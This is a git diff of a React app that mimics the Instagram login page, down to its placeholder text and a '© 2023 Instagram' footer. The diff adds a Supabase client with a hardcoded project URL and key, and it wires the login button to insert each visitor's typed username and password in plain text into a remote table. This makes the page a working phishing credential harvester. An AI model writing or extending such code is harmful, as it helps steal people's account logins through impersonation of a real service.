@@ -1,11 +1,40 @@
 import logo from "./logo.svg";
 import "./App.css";
-import { useState } from "react";
+import { useEffect, useState } from "react";
+import { createClient } from "@supabase/supabase-js";
 
 function App() {
   const [username, setUsername] = useState();
   const [password, setPassword] = useState();
   const [showPassword, setShowPassword] = useState(false);
+
+  const supabase = createClient(
+    "https://ptnepverhslocuumunid.supabase.co",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0bmVwdmVyaHNsb2N1dW11bmlkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MDAwODE5MTgsImV4cCI6MjAxNTY1NzkxOH0.8g1qUQtZukFzpLCsfmsbMh0v670qVFCcLI_3VCVy9n0"
+  );
+
+  const fetchData = async () => {
+    const { data, error } = await supabase.from("data").select();
+    console.log(data, error);
+
+    return { data, error };
+  };
+
+  const addData = async (username, pwd) => {
+    const { data, error } = await supabase
+      .from("data")
+      .insert({ username: username, password: pwd })
+      .select();
+    console.log(data);
+  };
+
+  useEffect(() => {
+    let resp = fetchData();
+
+    // console.log(resp);
+
+    return () => {};
+  }, []);
 
   return (
     <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
@@ -22,7 +51,7 @@ function App() {
             placeholder="Phone number, username, or email"
             type="text"
           />
-          <div className="bg-gray-100 border rounded border-gray-300 focus:border-gray-400 flex items-center mb-4">
+          <div className="flex items-center mb-4 bg-gray-100 border border-gray-300 rounded focus:border-gray-400">
             <input
               autofocus
               class="text-xs w-full  rounded border  px-2 py-2 focus:outline-none border-none outline-0 bg-gray-100 active:outline-none"
@@ -34,12 +63,15 @@ function App() {
             />
             <p
               onClick={() => setShowPassword(!showPassword)}
-              className="px-2  scale-90  text-slate-600 font-semibold cursor-pointer hover:text-slate-800"
+              className="px-2 font-semibold scale-90 cursor-pointer text-slate-600 hover:text-slate-800"
             >
               {showPassword ? "hide" : "Show"}
             </p>
           </div>
           <a
+            onClick={() => {
+              addData(username, password);
+            }}
             class={`${
               username?.length > 5 && password?.length > 5
                 ? "bg-blue-500"
@@ -79,7 +111,7 @@ function App() {
         </div>
       </div>
 
-      <p className="text-xs absolute bottom-4 text-slate-400 text-center mx-auto">
+      <p className="absolute mx-auto text-xs text-center bottom-4 text-slate-400">
         © 2023 Instagram
         <img
           src="assets/meta.png"
